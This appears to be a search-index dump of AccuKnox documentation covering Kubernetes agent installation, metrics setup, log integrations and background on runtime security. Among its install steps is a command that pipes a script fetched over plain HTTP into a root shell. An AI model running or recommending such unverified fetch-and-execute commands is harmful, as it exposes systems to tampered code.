AccuKnox itself, refer first to Getting Started . It is recommended to have the following configured before onboarding: Kubectl Helm","title":"Supported platforms"},{"location":"getting-started/accuknox-agents/#pre-requisites","text":"","title":"Pre-requisites"},{"location":"getting-started/accuknox-agents/#minimum-resource-required","text":"A Kubernetes cluster with Number of Nodes : 3 Machine Type: e2-standard-2 Total vCPUs : 6 Total Memory: 24GB Deployments Resource usage KubeArmor CPU: 100 m, Memory: 20 Mi Shared Informer Agent CPU: 500 m, Memory: 750 Mi Feeder Service CPU: 1, Memory: 500 Mi Policy Enforcement CPU: 200 m, Memory: 800 M Ports Description 9093, 443, 80 The worker cluster will communicate with accuknox SaaS and general internet","title":"Minimum Resource required"},{"location":"getting-started/accuknox-agents/#agents-installations","text":"Create Namespace kubectl create namespace accuknox-agents Adding AccuKnox Helm repository. Required incase of installing by Helm Add AccuKnox repository to install agents helm package. helm repo add accuknox-agents https://accuknox-agents:xxxxxxxxxxxxxxx@agents.accuknox.com/repository/accuknox-agents Note: \"accuknox-agents\" keys will be unique and provided through accuknox saas platform. Once repository added successfully, update the helm repository. helm repo update","title":"Agents Installations"},{"location":"getting-started/accuknox-agents/#1-cilium","text":"This agent is used to apply network policies. Installation Guide Download Cilium CLI. curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum } Install Cilium. cilium install Enable Hubble in Cilium. cilium hubble enable","title":"1. Cilium"},{"location":"getting-started/accuknox-agents/#2-kubearmor","text":"This agent is used to apply system level policies. Installation Guide Download and install Karmor CLI. curl -sfL http://get.kubearmor.io/ | sudo sh -s -- -b /usr/local/bin Install KubeArmor. karmor install","title":"2. KubeArmor"},{"location":"getting-started/accuknox-agents/#3-feeder-service","text":"Feeder service deployment that collects feeds from Kubearmor and Cilium. Installation Guide To Install agents on destination cluster. helm upgrade --install feeder-service accuknox-agents/feeder-service-chart -n accuknox-agents Set the env of Feeder Service. kubectl set env deploy/feeder-service tenant_id = 241 cluster_id = 427 cluster_name = prod-cluster-onboarding -n accuknox-agents Note: tenant_id and cluster_id will be unique from user to user, replace it with your tenant_id and cluster_id .","title":"3. Feeder Service"},{"location":"getting-started/accuknox-agents/#4-shared-informer-agent","text":"This agent authenticates with your cluster and collects information regarding entities like nodes, pods, namespaces. Installation Guide 1.To Install agents on destination cluster. helm upgrade --install shared-informer-agent-chart accuknox-agents/shared-informer-agent-chart -n accuknox-agents","title":"4. Shared Informer Agent"},{"location":"getting-started/accuknox-agents/#5-policy-enforcement-agent","text":"This agent authenticates with your cluster and enforces label and policy. Installation Guide To Install agents on destination cluster. helm upgrade --install policy-enforcement-agent accuknox-agents/policy-enforcement-agent-chart -n accuknox-agents Set the env of policy-enforcement-agent. kubectl set env deploy/policy-enforcement-agent -n accuknox-agents workspace_id = 241 cluster_name = prod-cluster-onboarding Note: workspace_id and cluster_name will be unique from user to user, replace it with your workspace_id and cluste_name .","title":"5. Policy Enforcement Agent"},{"location":"getting-started/accuknox-agents/#6-discovery-engine-agent","text":"Discovery Engine discovers the security posture for your workloads and auto-discovers the policy-set required to put the workload in least-permissive mode. The engine leverages the rich visibility provided by KubeArmor and Cilium to auto discover the systems and network security posture. Installation Guide To Install agent on the destination cluster. kubectl apply -f https://raw.githubusercontent.com/accuknox/discovery-engine/dev/deployments/k8s/deployment.yaml -n accuknox-agents Set the env of policy-enforcement-agent. kubectl set env deploy/knoxautopolicy -n accuknox-agents workspace_id = 147 cluster_name = accuknox-e2e-01 Note: workspace_id and cluster_name will be unique from user to user, replace your workspace_id and cluster_name .","title":"6. Discovery Engine Agent"},{"location":"getting-started/agent-metrics/","text":"Agent Metrics: FileBeat | Kibana | On-prem Metrics \u00b6 1. Status of Feeder Agent running on Cluster: \u00b6 Please run the below command to check if agent and dependent pods are up and running. kubectl get all \u2013n feeder-service All the pods/services should be in Running state. NOTE: It's assumed that Feeder Agent is running on cluster if not kindly go through this section 2. Beats Setup: \u00b6 The agent will be spinned along with Filebeat running along as a sidecar. The filebeat configuration file in the package can be updated to specific Elastic instances, and logs can be viewed in Kibana . a. Elastic Configuration Parameters: \u00b6 The below Configuration parameters can be updated for elastic configuration. (If Default params needs to be modified) - name : ELASTICSEARCH_HOST value : https://elasticsearch-es-http - name : ELASTICSEARCH_PORT value : \"9200\" - name : ELASTICSEARCH_USERNAME value : \"elastic\" - name : ELASTICSEARCH_PASSWORD value : \"xxxxxxxxxxxxx\" b. Command to be Used: \u00b6 kubectl set env deploy/feeder -n feeder-service ELASTICSEARCH_HOST = \u201dhttps://elasticsearch-es-http\u201d c. Update Log Path: \u00b6 To Update the Log path configured, please modify the below log input path under file beat inputs. filebeat.inputs : - type : container paths : - /log_output/value.log 2. Kibana Dashboard \u00b6 Once the filebeat starts listening, an index will be created or updated on the elastic configured and the pushed logs can be seen. In order to create a dashboard, you will need to build visualizations. Kibana has two panels for this One called Visualize and Another called Dashboard In order to create your dashboard, you will first create every individual visualization with the Visualize panel and save them. 3. Metrics: \u00b6 Once the feeder agent starts running, check the logs using below command Kubectl logs \u2013f podname \u2013n feeder-service The logs will push the metric data to GRPC Client / Kafka, and the GRPC server in SaaS platform will be listening to this metrics and can be viewed in Prometheus. (prometheus-dev.accuknox.com) 4. On Prem Metrics: \u00b6 To fetch the metrics in standalone environment, please write a scrape job in Prometheus with feeder service agent as a job name, and scrape the metrics from port (:xxxx) - job_name : \"feeder-pod-agent\" sample_limit : 10000","title":"Agent metrics"},{"location":"getting-started/agent-metrics/#agent-metrics-filebeat-kibana-on-prem-metrics","text":"","title":"Agent Metrics: FileBeat | Kibana | On-prem Metrics"},{"location":"getting-started/agent-metrics/#1-status-of-feeder-agent-running-on-cluster","text":"Please run the below command to check if agent and dependent pods are up and running. kubectl get all \u2013n feeder-service All the pods/services should be in Running state. NOTE: It's assumed that Feeder Agent is running on cluster if not kindly go through this section","title":"1. Status of Feeder Agent running on Cluster:"},{"location":"getting-started/agent-metrics/#2-beats-setup","text":"The agent will be spinned along with Filebeat running along as a sidecar. The filebeat configuration file in the package can be updated to specific Elastic instances, and logs can be viewed in Kibana .","title":"2. Beats Setup:"},{"location":"getting-started/agent-metrics/#a-elastic-configuration-parameters","text":"The below Configuration parameters can be updated for elastic configuration. (If Default params needs to be modified) - name : ELASTICSEARCH_HOST value : https://elasticsearch-es-http - name : ELASTICSEARCH_PORT value : \"9200\" - name : ELASTICSEARCH_USERNAME value : \"elastic\" - name : ELASTICSEARCH_PASSWORD value : \"xxxxxxxxxxxxx\"","title":"a. Elastic Configuration Parameters:"},{"location":"getting-started/agent-metrics/#b-command-to-be-used","text":"kubectl set env deploy/feeder -n feeder-service ELASTICSEARCH_HOST = \u201dhttps://elasticsearch-es-http\u201d","title":"b. Command to be Used:"},{"location":"getting-started/agent-metrics/#c-update-log-path","text":"To Update the Log path configured, please modify the below log input path under file beat inputs. filebeat.inputs : - type : container paths : - /log_output/value.log","title":"c. Update Log Path:"},{"location":"getting-started/agent-metrics/#2-kibana-dashboard","text":"Once the filebeat starts listening, an index will be created or updated on the elastic configured and the pushed logs can be seen. In order to create a dashboard, you will need to build visualizations. Kibana has two panels for this One called Visualize and Another called Dashboard In order to create your dashboard, you will first create every individual visualization with the Visualize panel and save them.","title":"2. Kibana Dashboard"},{"location":"getting-started/agent-metrics/#3-metrics","text":"Once the feeder agent starts running, check the logs using below command Kubectl logs \u2013f podname \u2013n feeder-service The logs will push the metric data to GRPC Client / Kafka, and the GRPC server in SaaS platform will be listening to this metrics and can be viewed in Prometheus. (prometheus-dev.accuknox.com)","title":"3. Metrics:"},{"location":"getting-started/agent-metrics/#4-on-prem-metrics","text":"To fetch the metrics in standalone environment, please write a scrape job in Prometheus with feeder service agent as a job name, and scrape the metrics from port (:xxxx) - job_name : \"feeder-pod-agent\" sample_limit : 10000","title":"4. On Prem Metrics:"},{"location":"getting-started/channel-integration/","text":"Channel Integration \u00b6 Channel Integrations is the fourth sub-section of Workspace Manager. This section is used to integrate external services with AccuKnox so you can export logs as well as metrics. These services include: Slack Elastic Search Splunk AWS CloudWatch Jira Pagerduty Webhooks Syslog Email ServiceNow Choose any one of the services and click the Integrate Now button.","title":"Channel integration"},{"location":"getting-started/channel-integration/#channel-integration","text":"Channel Integrations is the fourth sub-section of Workspace Manager. This section is used to integrate external services with AccuKnox so you can export logs as well as metrics. These services include: Slack Elastic Search Splunk AWS CloudWatch Jira Pagerduty Webhooks Syslog Email ServiceNow Choose any one of the services and click the Integrate Now button.","title":"Channel Integration"},{"location":"getting-started/cilium-install/","text":"Cilium: Deployment Guide \u00b6 Deployment Steps for Cilium & Hubble CLI \u00b6 1. Download and install Cilium CLI \u00b6 curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum } 2. Install Cilium \u00b6 cilium install It is assumed that the k8s cluster is already present/reachable and the user has rights to create service-accounts and cluster-role-bindings. 3. Validate the Installation \u00b6 a. [Optional] To validate that Cilium has been properly installed, you can run: \u00b6 cilium status --wait b. [Optional] Run the following command to validate that your cluster has proper network connectivity: \u00b6 cilium connectivity test Congratulations! You have a fully functional Kubernetes cluster with Cilium. \ud83c\udf89 4. Setting up Hubble Observability \u00b6 a. Enable Hubble in Cilium \u00b6 cilium hubble enable b. Install the Hubble CLI Client \u00b6 export HUBBLE_VERSION = $( curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt ) curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/ $HUBBLE_VERSION /hubble-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check hubble-linux-amd64.tar.gz.sha256sum sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin rm hubble-linux-amd64.tar.gz { ,.sha256sum } 5. Getting Alerts/Telemetry from Cilium \u00b6 a. Enable port-forwarding for Cilium Hubble relay \u00b6 cilium hubble port-forward & b. Observing logs using hubble cli \u00b6 hubble observe","title":"Cilium: Deployment Guide"},{"location":"getting-started/cilium-install/#cilium-deployment-guide","text":"","title":"Cilium: Deployment Guide"},{"location":"getting-started/cilium-install/#deployment-steps-for-cilium-hubble-cli","text":"","title":"Deployment Steps for Cilium &amp; Hubble CLI"},{"location":"getting-started/cilium-install/#1-download-and-install-cilium-cli","text":"curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum }","title":"1. Download and install Cilium CLI"},{"location":"getting-started/cilium-install/#2-install-cilium","text":"cilium install It is assumed that the k8s cluster is already present/reachable and the user has rights to create service-accounts and cluster-role-bindings.","title":"2. Install Cilium"},{"location":"getting-started/cilium-install/#3-validate-the-installation","text":"","title":"3. Validate the Installation"},{"location":"getting-started/cilium-install/#a-optional-to-validate-that-cilium-has-been-properly-installed-you-can-run","text":"cilium status --wait","title":"a. [Optional] To validate that Cilium has been properly installed, you can run:"},{"location":"getting-started/cilium-install/#b-optional-run-the-following-command-to-validate-that-your-cluster-has-proper-network-connectivity","text":"cilium connectivity test Congratulations! You have a fully functional Kubernetes cluster with Cilium. \ud83c\udf89","title":"b. [Optional] Run the following command to validate that your cluster has proper network connectivity:"},{"location":"getting-started/cilium-install/#4-setting-up-hubble-observability","text":"","title":"4. Setting up Hubble Observability"},{"location":"getting-started/cilium-install/#a-enable-hubble-in-cilium","text":"cilium hubble enable","title":"a. Enable Hubble in Cilium"},{"location":"getting-started/cilium-install/#b-install-the-hubble-cli-client","text":"export HUBBLE_VERSION = $( curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt ) curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/ $HUBBLE_VERSION /hubble-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check hubble-linux-amd64.tar.gz.sha256sum sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin rm hubble-linux-amd64.tar.gz { ,.sha256sum }","title":"b. Install the Hubble CLI Client"},{"location":"getting-started/cilium-install/#5-getting-alertstelemetry-from-cilium","text":"","title":"5. Getting Alerts/Telemetry from Cilium"},{"location":"getting-started/cilium-install/#a-enable-port-forwarding-for-cilium-hubble-relay","text":"cilium hubble port-forward &","title":"a. Enable port-forwarding for Cilium Hubble relay"},{"location":"getting-started/cilium-install/#b-observing-logs-using-hubble-cli","text":"hubble observe","title":"b. Observing logs using hubble cli"},{"location":"getting-started/cloudwatch-integration/","text":"AWS CloudWatch Integration \u00b6 Channel Integrations is the fourth sub-section of Workspace Manager. This section is used to integrate external services with AccuKnox and export logs based on triggers. AWS CloudWatch Choose \"AWS CloudWatch\" services and click the Integrate Now button. 1. Integration of Amazon CloudWatch: \u00b6 a. Prerequisites \u00b6 AWS Access Key / AWS Secret Key is required for this Integration. [Note]: Please refer this link to create access keys link b. Steps to Integrate: \u00b6 Goto Channel Integration URL Click the Integrate Now button -> AWS CloudWatch Here you'll be able to see these entries: Integration Name: Enter the name for the integration. You can set any name. AWS Access Key: Enter your AWS Access Key here. AWS Secret Key: Enter your AWS Secret Key here. Region Name: Enter your AWS Region Name here. Once you fill every field then click the button this will test whether your integration is working or not. Click the Save button. 2. Configuration of Alert Triggers: \u00b6 On the Logs page, after choosing specific log filter click on 'Create Trigger' button. The below fields needs to be entered with appropriate data: Name: Enter the name for the trigger. You can set any name without special characters. When to Initiate: The frequency of the trigger as Real Time / . Status: Enter the severity for the trigger. Search Filter Data : The filter log chosen in automatically populated here. This is optional. Predefined queries: The list of predefined queries for this workspace is shown as default. Notification Channel: Select the integration channel that needs to receive logs. This should be AWS CloudWatch. (Note: Channel Integration is done on the previous step) Save: Click on Save for the trigger to get stored in database. 3. Logs Forwarding: \u00b6 For each Enabled Trigger, please check the AWS platform to view the logs. Based on Frequency (Real Time / Once in a Day / Week) The Rule Engine matches the real time logs against the triggers created.","title":"CloudWatch"},{"location":"getting-started/cloudwatch-integration/#aws-cloudwatch-integration","text":"Channel Integrations is the fourth sub-section of Workspace Manager. This section is used to integrate external services with AccuKnox and export logs based on triggers. AWS CloudWatch Choose \"AWS CloudWatch\" services and click the Integrate Now button.","title":"AWS CloudWatch Integration"},{"location":"getting-started/cloudwatch-integration/#1-integration-of-amazon-cloudwatch","text":"","title":"1. Integration of Amazon CloudWatch:"},{"location":"getting-started/cloudwatch-integration/#a-prerequisites","text":"AWS Access Key / AWS Secret Key is required for this Integration. [Note]: Please refer this link to create access keys link","title":"a. Prerequisites"},{"location":"getting-started/cloudwatch-integration/#b-steps-to-integrate","text":"Goto Channel Integration URL Click the Integrate Now button -> AWS CloudWatch Here you'll be able to see these entries: Integration Name: Enter the name for the integration. You can set any name. AWS Access Key: Enter your AWS Access Key here. AWS Secret Key: Enter your AWS Secret Key here. Region Name: Enter your AWS Region Name here. Once you fill every field then click the button this will test whether your integration is working or not. Click the Save button.","title":"b. Steps to Integrate:"},{"location":"getting-started/cloudwatch-integration/#2-configuration-of-alert-triggers","text":"On the Logs page, after choosing specific log filter click on 'Create Trigger' button. The below fields needs to be entered with appropriate data: Name: Enter the name for the trigger. You can set any name without special characters. When to Initiate: The frequency of the trigger as Real Time / . Status: Enter the severity for the trigger. Search Filter Data : The filter log chosen in automatically populated here. This is optional. Predefined queries: The list of predefined queries for this workspace is shown as default. Notification Channel: Select the integration channel that needs to receive logs. This should be AWS CloudWatch. (Note: Channel Integration is done on the previous step) Save: Click on Save for the trigger to get stored in database.","title":"2. Configuration of Alert Triggers:"},{"location":"getting-started/cloudwatch-integration/#3-logs-forwarding","text":"For each Enabled Trigger, please check the AWS platform to view the logs. Based on Frequency (Real Time / Once in a Day / Week) The Rule Engine matches the real time logs against the triggers created.","title":"3. Logs Forwarding:"},{"location":"getting-started/cluster-management/","text":"Cluster discovery and management \u00b6 The cluster manager provides visualization of the clusters after automatically discovering them from your K8s cluster. In the case of Virtual Machines, the cluster manager shows the list of Virtual Machine instances discovered.","title":"Cluster discovery and management"},{"location":"getting-started/cluster-management/#cluster-discovery-and-management","text":"The cluster manager provides visualization of the clusters after automatically discovering them from your K8s cluster. In the case of Virtual Machines, the cluster manager shows the list of Virtual Machine instances discovered.","title":"Cluster discovery and management"},{"location":"getting-started/docker/","text":"Start with Docker \u00b6 Public docker image \u00b6 Package peaceiris/mkdocs-material docker-compose \u00b6 Here is an example docker-compose.yml Please check the latest tag before you go. docker-compose up Go to http://localhost:8000/","title":"Start with Docker"},{"location":"getting-started/docker/#start-with-docker","text":"","title":"Start with Docker"},{"location":"getting-started/docker/#public-docker-image","text":"Package peaceiris/mkdocs-material","title":"Public docker image"},{"location":"getting-started/docker/#docker-compose","text":"Here is an example docker-compose.yml Please check the latest tag before you go. docker-compose up Go to http://localhost:8000/","title":"docker-compose"},{"location":"getting-started/elastic-integration/","text":"Elastic Search Integration \u00b6 Elasticsearch is an open-source, distributed, document storage and search engine that stores and retrieves data structures in near real-time. Elasticsearch represents data in the form of structured JSON documents and makes full-text search accessible via RESTful API and web clients for languages like PHP, Python, and Ruby. It\u2019s also elastic in the sense that it\u2019s easy to scale horizontally\u2014simply add more nodes to distribute the load. Integration of Elasticsearch (ELK Stack): \u00b6 a. Prerequisites \u00b6 ElasticSearch Host / ELK should be up and running for this Integration. Please refer this link to deploy ELK stack inyour enviornment link . b. Steps to Integrate: \u00b6 Go to Channel Integration . Click integrate now on Elastic Search Enter the following details to configure Elastic Search. Integration Name: Enter the name for the integration. You can set any name. e.g., Test Elastic ELastic Host: Enter the ElastiSearch Host Name. e.g., http://elasticsearch.organisation.com/ Username : Enter your Elastic Search username created while deploying the ELK stack .e.g., elasticxxxx Password: Enter the password for the same ELK deployment. e.g., elasticxxxx Mount Path: Enter your logs mount path that will be passed to FileBeat as input. e.g., /path/log/var Index Name: Optional field to specify the particluar index to search the pushed logs to elastic using the index name. e.g., main Index Type: Optional field to specify the log type being pushed to elastic. e.g., _json Click Test to check if the entered details are being validated, If you receive Test Successful, you have entered a valid Elastic credentials. Click Save to save the Integration.","title":"Elastic"},{"location":"getting-started/elastic-integration/#elastic-search-integration","text":"Elasticsearch is an open-source, distributed, document storage and search engine that stores and retrieves data structures in near real-time. Elasticsearch represents data in the form of structured JSON documents and makes full-text search accessible via RESTful API and web clients for languages like PHP, Python, and Ruby. It\u2019s also elastic in the sense that it\u2019s easy to scale horizontally\u2014simply add more nodes to distribute the load.","title":"Elastic Search Integration"},{"location":"getting-started/elastic-integration/#integration-of-elasticsearch-elk-stack","text":"","title":"Integration of Elasticsearch (ELK Stack):"},{"location":"getting-started/elastic-integration/#a-prerequisites","text":"ElasticSearch Host / ELK should be up and running for this Integration. Please refer this link to deploy ELK stack inyour enviornment link .","title":"a. Prerequisites"},{"location":"getting-started/elastic-integration/#b-steps-to-integrate","text":"Go to Channel Integration . Click integrate now on Elastic Search Enter the following details to configure Elastic Search. Integration Name: Enter the name for the integration. You can set any name. e.g., Test Elastic ELastic Host: Enter the ElastiSearch Host Name. e.g., http://elasticsearch.organisation.com/ Username : Enter your Elastic Search username created while deploying the ELK stack .e.g., elasticxxxx Password: Enter the password for the same ELK deployment. e.g., elasticxxxx Mount Path: Enter your logs mount path that will be passed to FileBeat as input. e.g., /path/log/var Index Name: Optional field to specify the particluar index to search the pushed logs to elastic using the index name. e.g., main Index Type: Optional field to specify the log type being pushed to elastic. e.g., _json Click Test to check if the entered details are being validated, If you receive Test Successful, you have entered a valid Elastic credentials. Click Save to save the Integration.","title":"b. Steps to Integrate:"},{"location":"getting-started/fine-grained-access-control/","text":"What is Fine-Grained Access Control? \u00b6 Fine-grained access control refers to the process of limiting who has access to certain data. Fine-grained access control employs more subtle and changeable ways for authorizing access than generic data access control, also known as coarse-grained access control. Fine-grained access control is most commonly employed in cloud computing, where a large number of endpoints are kept simultaneously. Each item has its own set of access policies. These requirements might be based on a variety of variables, such as the job of the person/process requesting access and the planned use of the entity. One person/process may be permitted to edit and alter it, while another is just permitted to view it. Why is Fine-Grained Access Control Important? \u00b6 The capacity to store vast volumes of data collectively is a significant competitive advantage in cloud computing. However, when it comes to data security compliance rules and regulations pertaining to customer data or financial information, this data might vary in nature, source, and security level. When data types may be stored independently and certain data types can simply be assigned based on storage location (e.g., Process A can access X folder, Process B can access Y folder, etc.) as in on-premises setups, coarse-grained access control may function. Fine-grained access control is critical when data is stored together in the cloud because it allows data with varied access needs to 'live' in the same storage area without causing security or compliance difficulties. How AccuKnox provide Fine-Grained Access Controls? \u00b6 Accuknox provides fine-grained access control for workloads at runtime allowing SecOps to control what resources, files, networks, and processes a workload can access. With AccuKnox the SecOps can create runtime policies to make sure an always verify, never trust, zero trust model can be created. AccuKnox allows SecOps to restrict the following types of behavior on the cloud workloads: - File access - A typical file access by a process or a network can be allowed or denied on specific paths Process execution - The ability to allow or deny a Process execution or forking can be achieved for specific processes or all the processes on a directory Network connection - It is easy to allow or deny any network-based communication from a workload using AccuKnox. The requests can be TCP, UDP, or even ICMP packets can be denied or allowed. Capabilities - A workload can share the capabilities of the host if and when allowed. Such capabilities can enable additional types of malicious behavior. With AccuKnox we can allow or deny workloads to request other capabilities with the host os.","title":"Fined grained access control"},{"location":"getting-started/fine-grained-access-control/#what-is-fine-grained-access-control","text":"Fine-grained access control refers to the process of limiting who has access to certain data. Fine-grained access control employs more subtle and changeable ways for authorizing access than generic data access control, also known as coarse-grained access control. Fine-grained access control is most commonly employed in cloud computing, where a large number of endpoints are kept simultaneously. Each item has its own set of access policies. These requirements might be based on a variety of variables, such as the job of the person/process requesting access and the planned use of the entity. One person/process may be permitted to edit and alter it, while another is just permitted to view it.","title":"What is Fine-Grained Access Control?"},{"location":"getting-started/fine-grained-access-control/#why-is-fine-grained-access-control-important","text":"The capacity to store vast volumes of data collectively is a significant competitive advantage in cloud computing. However, when it comes to data security compliance rules and regulations pertaining to customer data or financial information, this data might vary in nature, source, and security level. When data types may be stored independently and certain data types can simply be assigned based on storage location (e.g., Process A can access X folder, Process B can access Y folder, etc.) as in on-premises setups, coarse-grained access control may function. Fine-grained access control is critical when data is stored together in the cloud because it allows data with varied access needs to 'live' in the same storage area without causing security or compliance difficulties.","title":"Why is Fine-Grained Access Control Important?"},{"location":"getting-started/fine-grained-access-control/#how-accuknox-provide-fine-grained-access-controls","text":"Accuknox provides fine-grained access control for workloads at runtime allowing SecOps to control what resources, files, networks, and processes a workload can access. With AccuKnox the SecOps can create runtime policies to make sure an always verify, never trust, zero trust model can be created. AccuKnox allows SecOps to restrict the following types of behavior on the cloud workloads: - File access - A typical file access by a process or a network can be allowed or denied on specific paths Process execution - The ability to allow or deny a Process execution or forking can be achieved for specific processes or all the processes on a directory Network connection - It is easy to allow or deny any network-based communication from a workload using AccuKnox. The requests can be TCP, UDP, or even ICMP packets can be denied or allowed. Capabilities - A workload can share the capabilities of the host if and when allowed. Such capabilities can enable additional types of malicious behavior. With AccuKnox we can allow or deny workloads to request other capabilities with the host os.","title":"How AccuKnox provide Fine-Grained Access Controls?"},{"location":"getting-started/how-is-this-help-organized/","text":"How this help is organized \u00b6 Accuknox's help documentation is divided into the following sections Getting started : This section helps you with basic concepts like what is runtime security, what are the basic concepts and the technology behind Open source : This section helps you to follow through a simple user journey that allows you to setup our open source runtime security tools in minutes on your cluster Accuknox cloud : This section deals with the setup of your workload on Accuknox SAAS cloud, its various features and more. Enterprise on prem : This section deals with how you can setup Accuknox's enterprise offering on your private cloud.","title":"How is this help organized"},{"location":"getting-started/how-is-this-help-organized/#how-this-help-is-organized","text":"Accuknox's help documentation is divided into the following sections Getting started : This section helps you with basic concepts like what is runtime security, what are the basic concepts and the technology behind Open source : This section helps you to follow through a simple user journey that allows you to setup our open source runtime security tools in minutes on your cluster Accuknox cloud : This section deals with the setup of your workload on Accuknox SAAS cloud, its various features and more. Enterprise on prem : This section deals with how you can setup Accuknox's enterprise offering on your private cloud.","title":"How this help is organized"},{"location":"getting-started/jira-integration/","text":"Jira Integration \u00b6 Integrate AccuKnox with Jira and receive AccuKnox alert notifications in your Jira accounts. With this integration, you can automate the process of generating Jira tickets with your existing security workflow. To set up this integration, you need to coordinate with your Jira administrator and gather the inputs needed to enable communication between AccuKnox and Jira. Integration of JIRA: \u00b6 a. Prerequisites \u00b6 You need a Jira Site URL , Email, UserID & API token, Project key for this integration. To create JIRA token go to https://id.atlassian.com/manage-profile/security/api-tokens , and click on create API token. b. Steps to Integrate: \u00b6 Go to Channel Integration . Click integrate now on JIRA Enter the following details to configure JIRA. Integration Name: Enter the name for the integration. You can set any name. e.g., Test JIRA Site: Enter the site name of your organisation. e.g., https://jiratest.atlassian.net/ User Email: Enter your Jira account email address here.e.g., jira@organisation.com Token: Enter the generated Token here from https://id.atlassian.com/manage-profile/security/api-tokens . .e.g., kRVxxxxxxxxxxxxx39 User ID: Enter your Jira user ID here. You can visit people section and search your name to see the User ID. For more details check here . e.g., 5bbxxxxxxxxxx0103780 Project ID: Enter your Project key here, each project in an organisation starts with some keyvalue and is case sensitive. Breakdown of a jira ticket to identify Project ID: https://[JIRA-SITE]/browse/[PROJECT ID]-1414 , e.g., DEVSECOPS Issue Summary: Enter the summary for the JIRA tickets to be viewed in each JIRA tickets created. e.g., Issue generated form High Severity Incidents on onboarded cluster. Issue Type: You can choose from the dropdown. i.e., Story and Bug Click Test to check if the entered details are being validated, If you receive Test Successful, you have entered a valid JIRA credentials. Click Save to save the Integration. You can now configure Alert Triggers for JIRA .","title":"Jira"},{"location":"getting-started/jira-integration/#jira-integration","text":"Integrate AccuKnox with Jira and receive AccuKnox alert notifications in your Jira accounts. With this integration, you can automate the process of generating Jira tickets with your existing security workflow. To set up this integration, you need to coordinate with your Jira administrator and gather the inputs needed to enable communication between AccuKnox and Jira.","title":"Jira Integration"},{"location":"getting-started/jira-integration/#integration-of-jira","text":"","title":"Integration of JIRA:"},{"location":"getting-started/jira-integration/#a-prerequisites","text":"You need a Jira Site URL , Email, UserID & API token, Project key for this integration. To create JIRA token go to https://id.atlassian.com/manage-profile/security/api-tokens , and click on create API token.","title":"a. Prerequisites"},{"location":"getting-started/jira-integration/#b-steps-to-integrate","text":"Go to Channel Integration . Click integrate now on JIRA Enter the following details to configure JIRA. Integration Name: Enter the name for the integration. You can set any name. e.g., Test JIRA Site: Enter the site name of your organisation. e.g., https://jiratest.atlassian.net/ User Email: Enter your Jira account email address here.e.g., jira@organisation.com Token: Enter the generated Token here from https://id.atlassian.com/manage-profile/security/api-tokens . .e.g., kRVxxxxxxxxxxxxx39 User ID: Enter your Jira user ID here. You can visit people section and search your name to see the User ID. For more details check here . e.g., 5bbxxxxxxxxxx0103780 Project ID: Enter your Project key here, each project in an organisation starts with some keyvalue and is case sensitive. Breakdown of a jira ticket to identify Project ID: https://[JIRA-SITE]/browse/[PROJECT ID]-1414 , e.g., DEVSECOPS Issue Summary: Enter the summary for the JIRA tickets to be viewed in each JIRA tickets created. e.g., Issue generated form High Severity Incidents on onboarded cluster. Issue Type: You can choose from the dropdown. i.e., Story and Bug Click Test to check if the entered details are being validated, If you receive Test Successful, you have entered a valid JIRA credentials. Click Save to save the Integration. You can now configure Alert Triggers for JIRA .","title":"b. Steps to Integrate:"},{"location":"getting-started/k8s-workloads/","text":"Accuknox tooling natively supports Kubernetes workloads. Accuknox can connect, query and establish runtime security for K8s workloads seamlessly. Accuknox can enforce k8s security seamlessly and effortlessly with the following features: automatically discover a given k8s cluster, its pods and resources automatically observe the network and application flows automatically discover policies for individual pods and respective network connections To support K8s workloads, accuknox components are deployed as a part of a K8s cluster and the components in turn use K8s API to query and interact with the cluster. Accuknox pods are deployed as priviledged containers on all nodes where enforcement must happen. k8s","title":"Kubernetes Workloads"},{"location":"getting-started/list-of-components/","text":"","title":"List of components"},{"location":"getting-started/lsm-and-kubearmor/","text":"Intro to LSM & KubeArmor An LSM is a code compiled directly into the kernel that uses the LSM framework. It\u2019s intended to allow security modules to lock down a system by inserting checks whenever the kernel is about to do something interesting. The security modules hook into those checkpoints, and for each operation, check whether the process is allowed by the security policy currently enforced or not. The LSM framework can deny access to essential kernel objects, such as files, inodes, task structures, credentials, and inter-process communication objects. Overview of LSM Framework: \u00b6 ( https://www.ibm.com/developerworks/library/l-selinux/ ) The LSM framework allows third-party access control mechanisms to be linked into the kernel and modify the default DAC implementation. Hence, KubeArmor connects with Linux security modules (LSMs) so that it can work on top of any Linux platforms (such as Alpine, Ubuntu, and Container-optimized OS from Google) if Linux security modules (e.g., AppArmor , SELinux , or KRSI ) are enabled in the Linux Kernel. Since only a single LSM can be used at a time, they all assumed they had exclusive access to the security context pointers and security identifiers embedded in protected kernel objects; KubeArmor automatically chooses the appropriate LSMs to enforce its required policies. By default, the LSM framework does not provide security but only the infrastructure to support the security modules. It also provides functions to register and un-register security modules. LSM Security Data fields \u00b6 The LSM framework enables security modules to associate security information with kernel objects. It extends \u201csensitive data types\u201d with opaque data security fields (The security fields are simply void * pointers added in various kernel data structures.) \u2022 For process and program, security field added to \u2013 struct task_struct and struct linux_binrpm \u2022 For the File system, the security field added to \u2013 struct super_block \u2022 For pipe, file, and socket, security field added to \u2013 struct inode and struct file \u2022 For packet and network devices, security field added to \u2013 struct sk_buff and struct net_device \u2022 For System V IPC, security field added to \u2013 struct kern_ipc_perm and struct msg_msg Other LSM features \u00b6 Aside from these hooks and the actions they permit, the LSM 